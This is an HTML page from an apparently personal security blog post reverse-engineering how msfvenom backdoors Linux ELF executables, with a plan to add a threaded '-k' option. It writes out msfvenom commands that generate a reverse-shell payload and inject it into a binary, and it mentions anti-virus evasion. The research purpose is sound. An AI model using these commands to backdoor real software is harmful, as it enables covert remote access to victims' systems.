@@ -1,0 +1,284 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="ja"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Improving Msfvenom Part&#8211;1 - Sheep Shellcode</title>
+  <meta name="author" content="Vincent Moscatello">
+
+  
+  <meta name="description" content="This is a progress/update on one of my current projects: improving the metasploit framework. In this part I am only doing reverse engineering/ &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://sheepshellcode.com/blog/2014/10/28/improving-msfvenom-project/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Sheep Shellcode" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-67946241-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body >
+  <div id="container">
+    <header role="banner"><hgroup>
+  <h1><a href="/">Sheep Shellcode</a></h1>
+  
+    <h2>The hackery blog of Vincent Moscatello.</h2>
+  
+</hgroup>
+
+</header>
+    <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:sheepshellcode.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/tutorials">Tutorials</a></li>
+  <li><a href="/resume/MoscatelloResume.pdf">Resume</a></li>
+  <li><a href="/archives">Archives</a></li>
+</ul>
+
+</nav>
+    <div id="main">
+      <div id="content">
+        <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title"><a href="">Improving Msfvenom Part&#8211;1</a></h1>
+    
+    
+      <div class="post-meta">
+        <p class="meta">
+          <span class="timestamp">- 
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2014-10-28T01:55:16-04:00" pubdate data-updated="true"></time> -</span>
+          
+        </p>
+      </div>
+    
+  </header>
+
+
+<div class="entry-content"><p>This is  a progress/update on one of my current projects: improving the metasploit framework. In this part I am only doing reverse engineering/analysis of how msfvenom currently backdoors ELF files. This is all in an effort to add the “-k” functionality to ELF executables, the windows equivalent of an exe.</p>
+
+<p>The -k flag is used by msfvenom to start a new thread for a payload that has been backdoored in an executable. This allows an attacker to preserve the original functionality of an executable while still executing the generated shellcode. This can come in quite handing for evading anti-virus. Unfortunately this feature is only available on 32-bit windows executables and msfvenom won&rsquo;t throw an error when you use this flag on a wrong file format.</p>
+
+<p>Currently when you run the following two commands they will produce an identical executable that does not have the functionality of the &ldquo;-k&rdquo; flag.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">31337</span> -f elf -x a.out &gt; backdooredNoK
+</span><span class='line'>
+</span><span class='line'>msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">31337</span> -f elf -k -x a.out &gt; backdoored
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This can be verified by performing an md5 hash of the two executables.</p>
+
+<p><img class="center" src="/images/msfvenom-part-1-resources/md5.png"></p>
+
+<p>To figure out what MsfVenom is actually doing, the executable can be loaded into IDA disassembler for static analysis. Before the program is backdoored, the program entry point (_start) looks like this:</p>
+
+<p><img class="center" src="/images/msfvenom-part-1-resources/normalstart.png"></p>
+
+<p>After being backdoored the program entry point (_start) looks like this:</p>
+
+<p><img class="center" src="/images/msfvenom-part-1-resources/backdooredstart.png"></p>
+
+<p>The original program entry point is simply overwritten with the shellcode. This can be verified by comparing the hex view in IDA of the (_start) function to the RAW output of shellcode that can be generated by MsfVenom.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msfvenom -p linux/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">31337</span> -f raw  &gt; RAW
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The hex dump from IDA looks like:</p>
+
+<p><img class="center" src="/images/msfvenom-part-1-resources/Idahexdump.png"></p>
+
+<p>This is identical to the RAW shell code:</p>
+
+<p><img class="center" src="/images/msfvenom-part-1-resources/rawshellcode.png"></p>
+
+<p>In order to make this projectmore manageable I&rsquo;ve broken it up into five chuncks each of which acts as its own milestone for tackling the problem.</p>
+
+<ol>
+<li>Reverse engineer Windows/Linux executables to determine how msfvenom is currently handling the &ldquo;-k&rdquo; option. (where is machine code stored, how is it triggered, is it loading libraries, etc)</li>
+<li>Using the gathered information, manually construct shellcode that will start in new thread for linux executable.</li>
+<li>Write script that automates the threading process of previous milestone</li>
+<li>Write script that embeds the new shellcode that starts in a thread into the elf executable.</li>
+<li>Interface this script with msfvenom&rsquo;s &ldquo;-k&rdquo; option</li>
+</ol>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Vincent Moscatello</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+
+<time datetime="2014-10-28T01:55:16-04:00" pubdate data-updated="true"></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/msfvenom/'>msfvenom</a>, <a class='category' href='/blog/categories/projects/'>projects</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/10/11/nmap-on-android/" title="Previous Post: Nmap on Android">&laquo; Nmap on Android</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/11/13/lets-play-with-visual-studio-hashmap/" title="Next Post: Lets Play with Visual Studio: Hashmap">Lets Play with Visual Studio: Hashmap &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+      </div><!-- /div#content -->
+    </div><!-- /div#main -->
+  </div><!-- /div.container -->
+  <footer><div id="footer-widgets-wrapper">
+  <div id="footer-first" class="footer-widget">
+    <h3>About Me</h3>
+    <p>Hacker, programmer, tinkerer want to do all the things.</p>
+    <section class="about-me">
+      
+      <div>
+        <ul>
+          
+            <li>GitHub: <a href="https://github.com/quantumvm">@quantumvm</a></li>
+          
+          
+            <li>Twitter: <a href="https://twitter.com/sheepshellcode">@sheepshellcode</a></li>
+          
+            <li>Blog: <a href="http://sheepshellcode.com">http://sheepshellcode.com</a></li>
+        </ul>
+      </div>
+    </section>
+  </div><!-- /div#footer-second -->
+
+  <div id="footer-second" class="footer-widget">
+    <h3>Involvement</h3>
+	<img src="/images/SIT-ROOM.jpg" height=122 width=163 />
+	<p>Most of my involvement revolves around being president of a club at UF called The Student Information Security Team.<b><p>
+
+	Take a look:
+	 
+	<a href="http://www.ufsit.org">www.ufsit.org</a> 
+	
+  </div><!-- /div#footer-second -->
+
+  <div id="footer-third" class="footer-widget">
+    <h3>Academics</h3>
+	<img src="/images/profile.jpg" height=122 width=140 />
+  	<p>I am a Computer Science (Engineering) student at the University of Florida.</p>
+	<p>B.S. Expected May 2016</p>
+  </div><!-- /div#footer-third -->
+</div><!-- /div#footer-widgets-wrapper -->
+
+<div id="credit" role="contentinfo">
+  <p>
+    Copyright &copy; 2016 - <a href="https://github.com/Vincent Moscatello/">Vincent Moscatello</a> -
+    <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+  </p>
+</div>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
